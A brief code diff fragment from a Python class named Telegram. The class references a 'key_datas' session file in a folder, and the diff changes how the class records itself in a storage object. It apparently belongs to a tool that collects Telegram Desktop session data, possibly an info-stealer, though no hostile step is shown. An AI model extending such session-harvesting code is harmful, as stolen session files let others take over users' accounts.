@@ -96,7 +96,7 @@ class Telegram:
             path.join(self.__folder, "key_datas")
         )
 
-        self.__storage.add_data("Telegram", True)
+        self.__storage.add_data("Application", "Telegram")
 
     def run(self) -> Data:
         """
